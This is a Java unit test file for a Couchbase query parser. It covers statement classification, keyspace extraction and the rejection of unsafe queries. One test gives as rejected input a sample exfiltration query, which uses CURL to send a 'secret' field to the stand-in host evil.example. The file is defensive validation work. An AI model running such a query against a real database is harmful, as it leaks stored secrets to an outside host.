package com.bablsoft.accessflow.engine.couchbase;

import com.bablsoft.accessflow.core.api.InvalidSqlException;
import com.bablsoft.accessflow.core.api.QueryType;
import org.junit.jupiter.api.Test;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

class CouchbaseQueryParserTest {

    private final CouchbaseQueryParser parser = new CouchbaseQueryParser(TestMessages.keyEcho());

    // ---- classification -----------------------------------------------------------------------

    @Test
    void classifiesSelect() {
        var result = parser.parse("SELECT name FROM users WHERE age > 21 LIMIT 10");
        assertThat(result.type()).isEqualTo(QueryType.SELECT);
        assertThat(result.transactional()).isFalse();
        assertThat(result.referencedTables()).containsExactly("users");
        assertThat(result.hasWhereClause()).isTrue();
        assertThat(result.hasLimitClause()).isTrue();
    }

    @Test
    void classifiesInsertAndUpsertAsInsert() {
        assertThat(parser.parse("INSERT INTO users (KEY, VALUE) VALUES ('k1', {'a': 1})").type())
                .isEqualTo(QueryType.INSERT);
        assertThat(parser.parse("UPSERT INTO users (KEY, VALUE) VALUES ('k1', {'a': 1})").type())
                .isEqualTo(QueryType.INSERT);
    }

    @Test
    void classifiesUpdateAndMergeAsUpdate() {
        assertThat(parser.parse("UPDATE users SET age = 30 WHERE name = 'Ada'").type())
                .isEqualTo(QueryType.UPDATE);
        assertThat(parser.parse(
                "MERGE INTO users AS t USING staged AS s ON t.id = s.id "
                        + "WHEN MATCHED THEN UPDATE SET t.a = s.a").type())
                .isEqualTo(QueryType.UPDATE);
    }

    @Test
    void classifiesDelete() {
        assertThat(parser.parse("DELETE FROM users WHERE age < 18").type())
                .isEqualTo(QueryType.DELETE);
    }

    @Test
    void classifiesDdl() {
        assertThat(parser.parse("CREATE PRIMARY INDEX ON users").type()).isEqualTo(QueryType.DDL);
        assertThat(parser.parse("CREATE INDEX idx_age ON users(age)").type())
                .isEqualTo(QueryType.DDL);
        assertThat(parser.parse("DROP INDEX idx_age ON users").type()).isEqualTo(QueryType.DDL);
        assertThat(parser.parse("CREATE SCOPE bucket1.app").type()).isEqualTo(QueryType.DDL);
        assertThat(parser.parse("CREATE COLLECTION people").type()).isEqualTo(QueryType.DDL);
        assertThat(parser.parse("DROP COLLECTION people").type()).isEqualTo(QueryType.DDL);
    }

    @Test
    void cteClassifiesByMainVerb() {
        var statement = parser.parseStatement(
                "WITH top AS (SELECT t.* FROM users AS t) SELECT * FROM orders");
        assertThat(statement.kind()).isEqualTo(CouchbaseStatementKind.SELECT);
        assertThat(statement.hasCte()).isTrue();
        assertThat(statement.keyspaces()).containsExactlyInAnyOrder("users", "orders");
    }

    // ---- rejection ----------------------------------------------------------------------------

    @Test
    void rejectsBlankAndNull() {
        assertThatThrownBy(() -> parser.parse(null)).isInstanceOf(InvalidSqlException.class)
                .hasMessageContaining("error.couchbase.blank");
        assertThatThrownBy(() -> parser.parse("   ")).isInstanceOf(InvalidSqlException.class)
                .hasMessageContaining("error.couchbase.blank");
    }

    @Test
    void rejectsMultipleStatements() {
        assertThatThrownBy(() -> parser.parse("SELECT 1; SELECT 2"))
                .isInstanceOf(InvalidSqlException.class)
                .hasMessageContaining("error.couchbase.multiple_statements");
    }

    @Test
    void toleratesTrailingSemicolon() {
        assertThat(parser.parse("SELECT 1;").type()).isEqualTo(QueryType.SELECT);
    }

    @Test
    void rejectsCurlFunction() {
        assertThatThrownBy(() -> parser.parse(
                "SELECT CURL('https://evil.example', {'data': u.secret}) FROM users u"))
                .isInstanceOf(InvalidSqlException.class)
                .hasMessageContaining("error.couchbase.curl_forbidden");
    }

    @Test
    void curlAsColumnNameIsNotAFunctionCall() {
        assertThat(parser.parse("SELECT curl FROM users").type()).isEqualTo(QueryType.SELECT);
    }

    @Test
    void rejectsJavascriptUdfStatements() {
        assertThatThrownBy(() -> parser.parse(
                "CREATE FUNCTION f(a) LANGUAGE JAVASCRIPT AS 'function f(a){return a}'"))
                .isInstanceOf(InvalidSqlException.class)
                .hasMessageContaining("error.couchbase.udf_forbidden");
        assertThatThrownBy(() -> parser.parse("CREATE OR REPLACE FUNCTION f() { 1 }"))
                .isInstanceOf(InvalidSqlException.class)
                .hasMessageContaining("error.couchbase.udf_forbidden");
        assertThatThrownBy(() -> parser.parse("EXECUTE FUNCTION f(1)"))
                .isInstanceOf(InvalidSqlException.class)
                .hasMessageContaining("error.couchbase.udf_forbidden");
        assertThatThrownBy(() -> parser.parse("DROP FUNCTION f"))
                .isInstanceOf(InvalidSqlException.class)
                .hasMessageContaining("error.couchbase.udf_forbidden");
    }

    @Test
    void rejectsSystemKeyspaces() {
        assertThatThrownBy(() -> parser.parse("SELECT * FROM system:keyspaces"))
                .isInstanceOf(InvalidSqlException.class)
                .hasMessageContaining("error.couchbase.system_keyspace_forbidden");
        assertThatThrownBy(() -> parser.parse("SELECT * FROM `system:keyspaces`"))
                .isInstanceOf(InvalidSqlException.class)
                .hasMessageContaining("error.couchbase.system_keyspace_forbidden");
    }

    @Test
    void rejectsUnsupportedStatements() {
        for (var sql : new String[]{"EXPLAIN SELECT 1", "ADVISE SELECT 1", "INFER users",
                "GRANT query_select ON users TO bob", "ALTER INDEX a ON b", "BEGIN WORK",
                "CREATE TABLE t (a int)", "TRUNCATE users"}) {
            assertThatThrownBy(() -> parser.parse(sql))
                    .as(sql)
                    .isInstanceOf(InvalidSqlException.class)
                    .hasMessageContaining("error.couchbase.unsupported_statement");
        }
    }

    @Test
    void rejectsUnbalancedInput() {
        assertThatThrownBy(() -> parser.parse("SELECT * FROM users WHERE name = 'Ada"))
                .isInstanceOf(InvalidSqlException.class)
                .hasMessageContaining("error.couchbase.unbalanced");
        assertThatThrownBy(() -> parser.parse("SELECT (1 FROM users"))
                .isInstanceOf(InvalidSqlException.class)
                .hasMessageContaining("error.couchbase.unbalanced");
        assertThatThrownBy(() -> parser.parse("SELECT 1) FROM users"))
                .isInstanceOf(InvalidSqlException.class)
                .hasMessageContaining("error.couchbase.unbalanced");
        assertThatThrownBy(() -> parser.parse("SELECT /* comment FROM users"))
                .isInstanceOf(InvalidSqlException.class)
                .hasMessageContaining("error.couchbase.unbalanced");
    }

    @Test
    void rejectsDmlWithoutKeyspace() {
        assertThatThrownBy(() -> parser.parse("DELETE FROM (SELECT 1) x"))
                .isInstanceOf(InvalidSqlException.class)
                .hasMessageContaining("error.couchbase.keyspace_required");
    }

    // ---- keyspace extraction ------------------------------------------------------------------

    @Test
    void extractsDottedKeyspacePathsLowercased() {
        var result = parser.parse("SELECT * FROM `Travel-Bucket`.Inventory.Hotels");
        assertThat(result.referencedTables()).containsExactly("travel-bucket.inventory.hotels");
    }

    @Test
    void stripsDefaultNamespacePrefix() {
        var result = parser.parse("SELECT * FROM default:bucket1.scope1.users");
        assertThat(result.referencedTables()).containsExactly("bucket1.scope1.users");
    }

    @Test
    void extractsJoinAndMergeSourceKeyspaces() {
        assertThat(parser.parse("SELECT * FROM orders o JOIN users u ON o.uid = META(u).id")
                .referencedTables()).containsExactlyInAnyOrder("orders", "users");
        assertThat(parser.parse(
                "MERGE INTO users AS t USING staged AS s ON t.id = s.id "
                        + "WHEN MATCHED THEN UPDATE SET t.a = s.a")
                .referencedTables()).containsExactlyInAnyOrder("users", "staged");
    }

    @Test
    void extractsSubqueryKeyspaces() {
        var result = parser.parse(
                "SELECT * FROM orders WHERE uid IN (SELECT RAW id FROM users)");
        assertThat(result.referencedTables()).containsExactlyInAnyOrder("orders", "users");
    }

    @Test
    void extractsDdlKeyspaces() {
        assertThat(parser.parse("CREATE INDEX idx ON bucket1.app.users(age)").referencedTables())
                .containsExactly("bucket1.app.users");
        assertThat(parser.parse("CREATE COLLECTION bucket1.app.users").referencedTables())
                .containsExactly("bucket1.app.users");
    }

    @Test
    void selectWithoutFromHasNoKeyspaces() {
        assertThat(parser.parse("SELECT 1").referencedTables()).isEmpty();
    }

    @Test
    void cteAliasesAreExcludedFromReferencedTables() {
        var result = parser.parse(
                "WITH eng AS (SELECT t.* FROM users t), big AS (SELECT o.* FROM orders o) "
                        + "SELECT * FROM eng");
        assertThat(result.referencedTables()).containsExactlyInAnyOrder("users", "orders");
    }

    @Test
    void commentsAndStringsDoNotConfuseTheClassifier() {
        var result = parser.parse("""
                -- leading comment with WHERE and ; inside
                SELECT name, 'LIMIT ; WHERE' AS marker /* JOIN in comment */
                FROM users
                """);
        assertThat(result.type()).isEqualTo(QueryType.SELECT);
        assertThat(result.referencedTables()).containsExactly("users");
        assertThat(result.hasWhereClause()).isFalse();
        assertThat(result.hasLimitClause()).isFalse();
    }

    // ---- structural flags ----------------------------------------------------------------------

    @Test
    void flagsStructuralShapes() {
        assertThat(parser.parseStatement("SELECT * FROM a UNION SELECT * FROM b")
                .hasSetOperation()).isTrue();
        assertThat(parser.parseStatement("SELECT * FROM users USE KEYS ['k1']").hasUseKeys())
                .isTrue();
        assertThat(parser.parseStatement("SELECT * FROM orders o UNNEST o.items AS i")
                .hasJoinLike()).isTrue();
        assertThat(parser.parseStatement(
                "SELECT * FROM orders WHERE uid IN (SELECT RAW id FROM users)").hasSubquery())
                .isTrue();
        assertThat(parser.parseStatement(
                "INSERT INTO archive (KEY META(u).id, VALUE u) SELECT u FROM users u")
                .hasSubquery()).isTrue();
    }

    @Test
    void capturesTargetAndAlias() {
        var statement = parser.parseStatement("SELECT * FROM users AS u WHERE u.age > 1");
        assertThat(statement.target().normalized()).isEqualTo("users");
        assertThat(statement.targetAlias()).isEqualTo("u");

        var noAlias = parser.parseStatement("SELECT * FROM users WHERE age > 1");
        assertThat(noAlias.targetAlias()).isNull();

        var update = parser.parseStatement("UPDATE bucket1.app.users SET a = 1");
        assertThat(update.target().normalized()).isEqualTo("bucket1.app.users");
        assertThat(update.target().lastSegment()).isEqualTo("users");
    }
}
